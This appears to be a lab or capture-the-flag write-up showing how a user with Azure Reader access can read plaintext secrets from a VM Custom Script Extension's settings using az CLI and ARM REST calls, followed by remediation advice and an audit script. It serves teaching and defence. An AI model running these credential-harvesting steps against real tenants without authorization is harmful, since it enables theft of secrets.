# VM Extension — Plaintext Settings in ARM

**Provider:** Azure | **Category:** Compute / Secrets

## Scenario

A team deployed a Custom Script Extension on a Linux VM to configure the application
at boot. The bootstrap script command was passed directly in the extension's `settings`
block — which is stored **unencrypted in ARM** and readable by any identity with Reader.

This contrasts with `protectedSettings`, which are encrypted at rest and never returned
by the ARM API. Many operators are unaware of this distinction and embed credentials
or secrets in `settings` instead of `protectedSettings`.

## Attack Path

```
[Attacker] Azure AD user (Reader on Resource Group)
    |
    v
az vm extension list --vm-name <vm> --resource-group <rg>  -->  find CustomScript extension
    |
    v
az vm extension show --name configure-app  -->  settings JSON
    |
    v
settings.commandToExecute  -->  flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — List VM extensions

```bash
RESOURCE_GROUP="<resource_group_name>"
VM_NAME="<vm_name>"

az vm extension list \
  --resource-group "${RESOURCE_GROUP}" \
  --vm-name "${VM_NAME}" \
  --output table
```

### Step 3 — Read the extension settings

```bash
az vm extension show \
  --resource-group "${RESOURCE_GROUP}" \
  --vm-name "${VM_NAME}" \
  --name configure-app \
  --query "settings" \
  --output json
```

The `commandToExecute` field contains the flag.

### Alternative — ARM REST API

```bash
TOKEN=$(az account get-access-token --query accessToken -o tsv)
SUBSCRIPTION_ID=$(az account show --query id -o tsv)

curl -s \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Compute/virtualMachines/${VM_NAME}/extensions/configure-app?api-version=2023-03-01" \
  -H "Authorization: Bearer ${TOKEN}" | jq '.properties.settings'
```

## How to Fix in Production

1. **Use `protectedSettings` for all sensitive values** — these are encrypted using
   the VM's certificate and are never returned by the ARM API in plaintext.
2. **Store credentials in Key Vault** and have the VM fetch them at runtime using
   its Managed Identity — avoid putting secrets in the extension command at all.
3. **Restrict Reader access** to VMs containing sensitive extensions — apply
   least-privilege RBAC so only operators see the VM resource details.
4. **Audit existing extensions** for plaintext sensitive settings:
   ```bash
   az vm list --query "[*].{Name:name,RG:resourceGroup}" -o tsv | \
     while read name rg; do
       az vm extension list -g "$rg" --vm-name "$name" -o tsv --query "[*].name" | \
         xargs -I{} az vm extension show -g "$rg" --vm-name "$name" -n {} --query settings
     done
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
